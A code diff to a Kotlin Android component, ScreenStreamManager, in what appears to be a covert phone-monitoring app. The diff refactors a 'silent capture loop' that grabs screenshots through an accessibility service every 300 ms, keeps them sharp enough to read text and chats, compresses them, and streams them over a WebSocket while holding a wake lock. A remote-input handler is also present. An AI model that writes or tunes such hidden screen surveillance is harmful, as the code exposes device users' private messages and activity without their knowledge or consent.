@@ -3,9 +3,6 @@ package com.spapp.monitoring.screenstream
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
 import android.graphics.Bitmap
-import android.graphics.Canvas
-import android.graphics.Paint
-import android.graphics.Rect
 import android.os.Build
 import android.os.PowerManager
 import android.os.SystemClock
@@ -54,10 +51,10 @@ import kotlin.coroutines.resume
 object ScreenStreamManager {
 
     private const val TAG = "ScreenStreamManager"
-    private const val DEFAULT_CAPTURE_INTERVAL_MS = 300L // Fast AOSP screenshot interval
-    private const val TARGET_MAX_DIMENSION = 720        // Crisp 720p HD resolution for readable text & chats
-    private const val JPEG_QUALITY = 70                 // High clarity without artifacts
-    private const val MAX_WS_QUEUE_BYTES = 128 * 1024L   // 128 KB buffer headroom
+    private const val MIN_CAPTURE_INTERVAL_MS = 300L  // Fast & stable 300ms capture interval
+    private const val TARGET_MAX_DIMENSION = 720      // Crisp 720p HD resolution for readable text & chats
+    private const val JPEG_QUALITY = 70               // Clean image clarity without heavy compression artifacts
+    private const val MAX_WS_QUEUE_BYTES = 128 * 1024L // 128 KB buffer headroom
 
     // Packet type indicator for video JPEG
     private const val PACKET_TYPE_VIDEO: Byte = 0x01
@@ -70,14 +67,6 @@ object ScreenStreamManager {
     private var activeWebSocket: WebSocket? = null
     private var wakeLock: PowerManager.WakeLock? = null
     private val isStreaming = AtomicBoolean(false)
-
-    // Reusable encoding pipeline buffers to eliminate memory churn & garbage collection stutter
-    @Volatile
-    private var adaptiveCaptureIntervalMs = DEFAULT_CAPTURE_INTERVAL_MS
-    private var reusableScaledBitmap: Bitmap? = null
-    private var reusableCanvas: Canvas? = null
-    private val reusablePaint = Paint(Paint.FILTER_BITMAP_FLAG)
-    private val reusableStream = ByteArrayOutputStream(64 * 1024)
 
     private var currentAuthToken: String? = null
     private var currentDeviceId: String? = null
@@ -262,17 +251,6 @@ object ScreenStreamManager {
         } catch (_: Exception) {}
         wakeLock = null
 
-        // Cleanup reusable stream and bitmap cache
-        try {
-            reusableScaledBitmap?.recycle()
-        } catch (_: Exception) {}
-        reusableScaledBitmap = null
-        reusableCanvas = null
-        synchronized(reusableStream) {
-            reusableStream.reset()
-        }
-        adaptiveCaptureIntervalMs = DEFAULT_CAPTURE_INTERVAL_MS
-
         val cb = onStreamStoppedCallback
         onStreamStoppedCallback = null
         cb?.invoke()
@@ -281,20 +259,20 @@ object ScreenStreamManager {
     private fun startCaptureLoop(context: Context, ws: WebSocket) {
         streamJob?.cancel()
         streamJob = scope.launch(Dispatchers.Default) {
-            Log.d(TAG, "High-performance silent capture loop started (adaptive interval)")
+            Log.d(TAG, "High-performance silent capture loop started")
             var lastCaptureStartTime = 0L
 
             while (isActive && isStreaming.get() && activeWebSocket == ws) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     val now = SystemClock.uptimeMillis()
                     val elapsed = now - lastCaptureStartTime
-                    if (elapsed < adaptiveCaptureIntervalMs) {
-                        delay(adaptiveCaptureIntervalMs - elapsed)
+                    if (elapsed < MIN_CAPTURE_INTERVAL_MS) {
+                        delay(MIN_CAPTURE_INTERVAL_MS - elapsed)
                     }
 
                     // Drop frame only if WebSocket outgoing buffer is heavily congested (> 128 KB)
                     if (ws.queueSize() > MAX_WS_QUEUE_BYTES) {
-                        delay(40L)
+                        delay(50L)
                         continue
                     }
 
@@ -329,11 +307,6 @@ object ScreenStreamManager {
                     screenshotExecutor,
                     object : AccessibilityService.TakeScreenshotCallback {
                         override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
-                            // On successful captures, optimize toward minimum viable AOSP threshold (~280ms)
-                            if (adaptiveCaptureIntervalMs > 280L) {
-                                adaptiveCaptureIntervalMs = (adaptiveCaptureIntervalMs - 2L).coerceAtLeast(280L)
-                            }
-
                             scope.launch(Dispatchers.Default) {
                                 val hardwareBuffer = screenshotResult.hardwareBuffer
                                 val colorSpace = screenshotResult.colorSpace
@@ -349,48 +322,13 @@ object ScreenStreamManager {
                                         hwBitmap.recycle()
 
                                         if (swBitmap != null) {
-                                            val width = swBitmap.width
-                                            val height = swBitmap.height
+                                            val scaled = downscaleBitmap(swBitmap, TARGET_MAX_DIMENSION)
+                                            val out = ByteArrayOutputStream(32 * 1024)
+                                            scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
+                                            val jpegBytes = out.toByteArray()
 
-                                            val dstWidth: Int
-                                            val dstHeight: Int
-                                            if (width <= TARGET_MAX_DIMENSION && height <= TARGET_MAX_DIMENSION) {
-                                                dstWidth = width
-                                                dstHeight = height
-                                            } else {
-                                                val scale = TARGET_MAX_DIMENSION.toFloat() / maxOf(width, height)
-                                                dstWidth = (width * scale).toInt().coerceAtLeast(1)
-                                                dstHeight = (height * scale).toInt().coerceAtLeast(1)
-                                            }
-
-                                            val scaledBitmap: Bitmap
-                                            if (dstWidth == width && dstHeight == height) {
-                                                scaledBitmap = swBitmap
-                                            } else {
-                                                var cached = reusableScaledBitmap
-                                                if (cached == null || cached.isRecycled || cached.width != dstWidth || cached.height != dstHeight) {
-                                                    try { cached?.recycle() } catch (_: Exception) {}
-                                                    cached = Bitmap.createBitmap(dstWidth, dstHeight, Bitmap.Config.RGB_565)
-                                                    reusableScaledBitmap = cached
-                                                    reusableCanvas = Canvas(cached)
-                                                }
-                                                val canvas = reusableCanvas!!
-                                                val srcRect = Rect(0, 0, width, height)
-                                                val dstRect = Rect(0, 0, dstWidth, dstHeight)
-                                                canvas.drawBitmap(swBitmap, srcRect, dstRect, reusablePaint)
-                                                scaledBitmap = cached
-                                            }
-
-                                            // Compress with reusable stream buffer to eliminate GC allocation churn
-                                            val jpegBytes = synchronized(reusableStream) {
-                                                reusableStream.reset()
-                                                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, reusableStream)
-                                                reusableStream.toByteArray()
-                                            }
-
-                                            if (swBitmap != scaledBitmap) {
-                                                swBitmap.recycle()
-                                            }
+                                            if (scaled != swBitmap) scaled.recycle()
+                                            swBitmap.recycle()
 
                                             // Send if stream is active and socket is still active
                                             if (isStreaming.get() && activeWebSocket == ws && ws.queueSize() <= MAX_WS_QUEUE_BYTES) {
@@ -414,13 +352,9 @@ object ScreenStreamManager {
                             Log.d(TAG, "takeScreenshot failure code: $errorCode")
                             scope.launch(Dispatchers.Default) {
                                 when (errorCode) {
-                                    AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> {
-                                        // Device enforces slightly longer interval, adaptively increment
-                                        adaptiveCaptureIntervalMs = (adaptiveCaptureIntervalMs + 20L).coerceAtMost(380L)
-                                        delay(50L)
-                                    }
-                                    AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> delay(100L)
-                                    else -> delay(80L)
+                                    AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> delay(60L)
+                                    AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> delay(120L)
+                                    else -> delay(100L)
                                 }
                                 if (continuation.isActive) continuation.resume(Unit)
                             }
@@ -432,6 +366,16 @@ object ScreenStreamManager {
                 if (continuation.isActive) continuation.resume(Unit)
             }
         }
+    }
+
+    private fun downscaleBitmap(src: Bitmap, maxDim: Int): Bitmap {
+        val width = src.width
+        val height = src.height
+        if (width <= maxDim && height <= maxDim) return src
+        val scale = maxDim.toFloat() / maxOf(width, height)
+        val dstWidth = (width * scale).toInt().coerceAtLeast(1)
+        val dstHeight = (height * scale).toInt().coerceAtLeast(1)
+        return Bitmap.createScaledBitmap(src, dstWidth, dstHeight, true)
     }
 
     private fun handleRemoteInput(context: Context, json: JSONObject) {
